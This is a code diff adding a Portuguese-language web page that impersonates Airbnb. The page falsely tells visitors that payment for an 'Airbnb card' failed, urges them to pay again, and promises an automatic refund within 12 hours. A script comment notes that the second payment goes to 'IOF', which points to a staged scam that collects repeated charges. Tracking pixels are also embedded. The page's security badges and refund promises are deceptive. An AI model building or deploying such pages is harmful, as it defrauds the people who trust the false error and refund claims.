@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<script>
+  window.tikTokPixelId = "69edaaffbdf66cc14237f33f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+  ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+  ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+  for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+  ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+  ttq.load=function(e,n){
+    var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+    ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=r;
+    ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+    ttq._o=ttq._o||{};ttq._o[e]=n||{};
+    n=document.createElement("script");n.type="text/javascript";n.async=!0;
+    n.src=r+"?sdkid="+e+"&lib="+t;
+    e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)
+  };
+  ttq.load("D7MEITBC77U9TECL9BF0");
+  ttq.page();
+}(window, document, "ttq");
+</script>
+<!-- TikTok Pixel Code End -->
+
+
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Erro no Pagamento — Cartão Airbnb</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--red:#FF385C;--red-dark:#E00B41;--black:#1A1A1A;--gray:#6A6A6A;--gray-light:#DDDDDD;--bg:#F7F7F7;--white:#FFFFFF;--green:#34C759;--warn:#FF9F0A;--font:'Sora',-apple-system,sans-serif}
+        body{font-family:var(--font);background:var(--bg);color:var(--black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--white)}
+
+        /* NAV */
+        .nav{display:flex;align-items:center;padding:13px 20px;border-bottom:1px solid var(--gray-light);background:rgba(255,255,255,.96);backdrop-filter:blur(10px);position:sticky;top:0;z-index:100}
+        .nav-logo{flex:1;text-align:center}
+        .nav-logo svg{height:22px;fill:var(--red)}
+        .nav-sec{display:flex;align-items:center;gap:4px;font-size:.68rem;color:var(--gray);font-weight:600}
+        .nav-sec i{font-size:11px}
+
+        .content{padding:28px 20px 40px}
+
+        /* ERROR ICON */
+        .err-icon-wrap{display:flex;justify-content:center;margin-bottom:24px}
+        .err-icon{width:80px;height:80px;border-radius:50%;background:rgba(255,59,48,.1);border:3px solid rgba(255,59,48,.2);display:flex;align-items:center;justify-content:center;font-size:32px;color:#FF3B30;animation:shake .5s ease .2s both}
+        @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+
+        /* MAIN MESSAGE */
+        .err-title{font-size:1.3rem;font-weight:800;text-align:center;margin-bottom:10px;color:var(--black);letter-spacing:-.02em}
+        .err-sub{font-size:.875rem;color:var(--gray);text-align:center;line-height:1.6;margin-bottom:24px}
+
+        /* INFO CARD */
+        .info-card{background:rgba(255,149,10,.06);border:1px solid rgba(255,149,10,.18);border-radius:16px;padding:16px 18px;margin-bottom:24px;display:flex;gap:14px;align-items:flex-start}
+        .ic-icon{width:38px;height:38px;border-radius:10px;background:rgba(255,149,10,.14);display:flex;align-items:center;justify-content:center;font-size:18px;color:var(--warn);flex-shrink:0;margin-top:2px}
+        .ic-title{font-size:.85rem;font-weight:700;color:#B36B00;margin-bottom:3px}
+        .ic-desc{font-size:.78rem;color:#8A5200;line-height:1.5}
+
+        /* REFUND CARD */
+        .refund-card{background:rgba(52,199,89,.05);border:1px solid rgba(52,199,89,.18);border-radius:16px;padding:16px 18px;margin-bottom:28px;display:flex;gap:14px;align-items:center}
+        .rc-icon{width:38px;height:38px;border-radius:10px;background:rgba(52,199,89,.12);display:flex;align-items:center;justify-content:center;font-size:18px;color:var(--green);flex-shrink:0}
+        .rc-title{font-size:.82rem;font-weight:700;color:#1a7a38;margin-bottom:2px}
+        .rc-desc{font-size:.75rem;color:#2a9148;line-height:1.5}
+
+        /* CTA BUTTON */
+        .retry-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:17px;border:none;border-radius:14px;font-size:.98rem;font-weight:700;cursor:pointer;font-family:var(--font);background:var(--red);color:#fff;transition:.25s;margin-bottom:14px;text-decoration:none;box-shadow:0 6px 22px rgba(255,56,92,.25)}
+        .retry-btn:hover{filter:brightness(1.06);transform:translateY(-2px)}
+        .retry-btn:active{transform:scale(.98)}
+
+        /* SUPPORT LINE */
+        .support-line{text-align:center;font-size:.75rem;color:var(--gray);line-height:1.6}
+
+        /* DIVIDER */
+        .divider{height:1px;background:var(--gray-light);margin:24px 0}
+
+        /* STEPS */
+        .steps-title{font-size:.82rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray);margin-bottom:14px}
+        .step-item{display:flex;gap:12px;margin-bottom:14px;align-items:flex-start}
+        .step-num{width:26px;height:26px;border-radius:50%;background:var(--black);color:#fff;font-size:.7rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .step-text{font-size:.8rem;color:var(--gray);line-height:1.6;padding-top:3px}
+        .step-text strong{color:var(--black)}
+
+        /* SECURITY ROW */
+        .sec-row{display:flex;justify-content:center;gap:16px;margin-top:22px}
+        .sec-item{display:flex;align-items:center;gap:5px;font-size:.68rem;color:var(--gray);font-weight:600}
+        .sec-item i{font-size:12px}
+    </style>
+</head>
+<body>
+<div class="page">
+    <div class="nav">
+        <div style="width:32px"></div>
+        <div class="nav-logo">
+            <svg viewBox="0 0 1007 1080"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 470.209 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+        </div>
+        <div class="nav-sec"><i class="fas fa-lock"></i> Seguro</div>
+    </div>
+
+    <div class="content">
+        <!-- ERROR ICON -->
+        <div class="err-icon-wrap">
+            <div class="err-icon"><i class="fas fa-times-circle"></i></div>
+        </div>
+
+        <!-- MAIN MESSAGE -->
+        <h1 class="err-title">Erro no processamento do pagamento</h1>
+        <p class="err-sub">Ocorreu um erro no processamento do seu pagamento.<br>Você precisa pagar novamente.</p>
+
+        <!-- WARNING CARD -->
+        <div class="info-card">
+            <div class="ic-icon"><i class="fas fa-exclamation-triangle"></i></div>
+            <div>
+                <div class="ic-title">Pagamento não confirmado</div>
+                <div class="ic-desc">O seu pagamento não pôde ser processado neste momento. Por favor, tente novamente para garantir a emissão do seu cartão.</div>
+            </div>
+        </div>
+
+        <!-- REFUND CARD -->
+        <div class="refund-card">
+            <div class="rc-icon"><i class="fas fa-undo-alt"></i></div>
+            <div>
+                <div class="rc-title">Estorno automático garantido</div>
+                <div class="rc-desc">O valor cobrado será estornado automaticamente em até <strong>12 horas</strong>. Nenhuma ação é necessária da sua parte.</div>
+            </div>
+        </div>
+
+        <!-- RETRY BUTTON -->
+        <a class="retry-btn" href="#" onclick="tentarNovamente(event)">
+            <i class="fas fa-redo"></i> Tentar pagar novamente
+        </a>
+
+        <div class="support-line">Precisa de ajuda? Entre em contato com nosso suporte.</div>
+
+        <div class="divider"></div>
+
+        <!-- STEPS -->
+        <div class="steps-title">O que acontece agora?</div>
+        <div class="step-item">
+            <div class="step-num">1</div>
+            <div class="step-text"><strong>Clique em "Tentar pagar novamente"</strong> para voltar ao checkout e refazer o pagamento de forma segura.</div>
+        </div>
+        <div class="step-item">
+            <div class="step-num">2</div>
+            <div class="step-text">Se houve cobrança indevida, o <strong>estorno ocorre automaticamente em até 12h</strong> no mesmo método de pagamento usado.</div>
+        </div>
+        <div class="step-item">
+            <div class="step-num">3</div>
+            <div class="step-text">Após o novo pagamento ser confirmado, seu <strong>cartão Airbnb será emitido</strong> normalmente.</div>
+        </div>
+
+        <!-- SECURITY ROW -->
+        <div class="sec-row">
+            <div class="sec-item"><i class="fas fa-shield-alt"></i> Pagamento seguro</div>
+            <div class="sec-item"><i class="fas fa-lock"></i> SSL 256-bit</div>
+            <div class="sec-item"><i class="fas fa-undo-alt"></i> Estorno garantido</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+    function buildUrl(base,extra={}){const url=new URL(base,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>url.searchParams.set(k,v));Object.entries(extra).forEach(([k,v])=>{if(v)url.searchParams.set(k,v)});return url.toString();}
+
+    function tentarNovamente(e){
+        e.preventDefault();
+        // Garante que o step está como 1 (segundo pagamento vai para IOF)
+        sessionStorage.setItem('airbnb_payment_step', '1');
+        window.location.href = buildUrl('checkout.html');
+    }
+</script>
+</body>
+</html>
